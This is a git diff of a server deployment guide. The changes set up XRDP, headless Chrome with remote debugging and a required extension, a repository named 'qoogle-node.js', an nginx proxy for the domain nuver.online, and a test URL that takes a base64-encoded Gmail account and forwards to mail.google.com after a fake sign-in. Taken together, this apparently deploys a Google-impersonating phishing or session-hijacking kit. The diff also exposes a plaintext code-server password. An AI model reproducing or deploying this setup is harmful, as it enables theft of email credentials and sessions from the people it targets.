@@ -13,16 +13,15 @@ sudo adduser <username>
 sudo usermod -aG sudo <username>
 ```
 
-### 1.2 Install XRDP and XFCE
-
+### 1.2 Install XRDP and XFCE, XCFB
 ```bash
 # Install XRDP for remote desktop
 
 sudo apt install xrdp -y
 
-# Install XFCE desktop environment
+# Install XFCE desktop environment and virtual Display environment
 
-sudo apt install xfce4 xfce4-goodies -y
+sudo apt install xfce4 xfce4-goodies xvfb -y
 
 # Configure XRDP to use XFCE
 
@@ -38,6 +37,63 @@ sudo systemctl restart xrdp
 sudo ufw allow 3389
 
 ```
+And then restart the VPS.
+### Result Testing
+
+![RDP Connection](./imgs/1-1.png)
+
+![RDP Connection](./imgs/1-2.png)
+
+![RDP Connection](./imgs/1-3.png)
+
+
+
+### 1.3 Install chrome and Set up the chrome
+```bash
+# Download Chrome
+curl -O https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+# Install Chrome
+
+sudo apt install ./google-chrome-stable_current_amd64.deb -y
+```
+#### Open Terminal first
+
+![RDP Connection](./imgs/1-4.png)
+
+```bash
+# make the backup directory
+sudo mkdir -p /chromeTemp/backup
+sudo chmod 777 -R /chromeTemp
+
+google-chrome-stable \
+        --remote-debugging-port=9200 \
+        --user-data-dir="/chromeTemp/backup" \
+        --no-first-run \
+        --no-default-browser-check \
+        --headless=new \
+        --disable-features=TranslateUI &
+
+```
+
+![RDP Connection](./imgs/1-5.png)
+
+```bash
+# Continue chrome.
+```
+
+![RDP Connection](./imgs/1-6.png)
+![RDP Connection](./imgs/1-7.png)
+
+#### Chrome temp directory.
+![RDP Connection](./imgs/1-8.png)
+
+chrome-extension://bhghoamapcdpbohphigoooaddinpkbai/view/popup.html  
+This url has to be available.
+
+
+![RDP Connection](./imgs/1-9.png)
+
+![RDP Connection](./imgs/1-10.png)
 
 ## 2. Code-Server Installation
 
@@ -59,11 +115,13 @@ sudo systemctl status code-server@$USER
 nano ~/.config/code-server/config.yaml
 
 # Typical configuration:
-# bind-addr: 0.0.0.0:8080
-# auth: password
-# password: your_secure_password
-# cert: false
+bind-addr: 0.0.0.0:8888
+auth: password
+password: 935bf8d08052c5c660e826f7
+cert: false
 ```
+
+![RDP Connection](./imgs/3-1.png)
 
 ## 3. Project Setup
 ### Install Git and Clone Repository
@@ -73,12 +131,17 @@ nano ~/.config/code-server/config.yaml
 # Install git
 sudo apt install git -y
 
+mkdir -p ~/workspace
+
 # Clone your project
-git clone <your-repository-url>
-cd <project-directory>
+git clone http://172.21.103.10:3000/oleg/qoogle-node.js.git google-node
+
+cd google-node
+```
+### Generate the temp directoy
+```bash
 
 ```
-
 ## 4. Nginx Installation and Configuration
 ### Install Nginx
 ```bash
@@ -94,21 +157,26 @@ sudo systemctl enable nginx
 ```bash
 # Create nginx configuration file
 sudo nano /etc/nginx/sites-available/your-domain
+```
 
-# Add the following configuration:
+```bash
 server {
+	server_name nuver.online;
+
+
+	location / {
+	        proxy_pass http://localhost:8101;
+
+	        # Preserve client details
+	        proxy_set_header Host              $host;
+	        proxy_set_header X-Real-IP         $remote_addr;
+	        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
+	        proxy_set_header X-Forwarded-Proto $scheme;
+	}
     listen 80;
-    server_name your-domain.com www.your-domain.com;
-
-    location / {
-        proxy_pass http://localhost:8080;
-        proxy_set_header Host $host;
-        proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection upgrade;
-        proxy_set_header Accept-Encoding gzip;
-    }
 }
-
+```
+```bash
 # Enable the site
 sudo ln -s /etc/nginx/sites-available/your-domain /etc/nginx/sites-enabled/
 
@@ -150,13 +218,10 @@ npm --version
 ## 6. Project Dependencies Installation
 ```bash
 # Navigate to project directory
-cd /path/to/your/project
+cd ~/workspace/google-node/
 
 # Install npm dependencies
 npm install
-
-# If you have specific build commands
-npm run build
 
 # For development
 npm run dev
@@ -177,7 +242,7 @@ sudo ufw allow 8080  # Code-server (if not using nginx proxy)
 # Check firewall status
 sudo ufw status
 ```
-## 8. Optional: SSL Certificate with Let's Encrypt
+## 8. SSL Certificate with Let's Encrypt
 
 ```bash
 # Install certbot
@@ -189,3 +254,14 @@ sudo certbot --nginx -d your-domain.com -d www.your-domain.com
 # Test auto-renewal
 sudo certbot renew --dry-run
 ```
+
+## 9. Testing
+### URL
+https://your-domain.com/information/session/sign?hl=ko&acc=amhhcnJ5MDMwMQ==&forward=aHR0cHM6Ly9tYWlsLmdvb2dsZS5jb20=
+
+hl: language  
+acc: gmail account(base64 encoded)  
+forward: froward url after login success (base64 encoded)
+
+###  [TEST URL] (cookie delete)
+https://your-domain.com/test
